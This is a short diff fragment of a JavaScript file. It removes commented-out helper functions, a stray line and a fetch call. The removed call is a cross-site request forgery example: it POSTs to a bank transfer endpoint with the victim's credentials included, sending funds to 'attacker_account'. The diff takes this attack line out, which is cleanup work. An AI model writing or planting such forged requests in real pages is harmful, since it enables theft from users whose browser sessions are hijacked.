@@ -21,24 +21,4 @@ fetch(apiUrl, requestOptions)
     console.error('Error;', error)
   })
 
-// function inc() {
-//   count.textContent = c;
-//   // update();
-// }
-
-// function update() {
-
-// }
-
-fetch("https://yourbank.com/api/transfer-funds", {
-  method: "POST",
-  credentials: "include",
-  body: JSON.stringify({ to: "attacker_account", amount: 1000 })
-});
-
-OPTIONS/
-
-
-
-
 
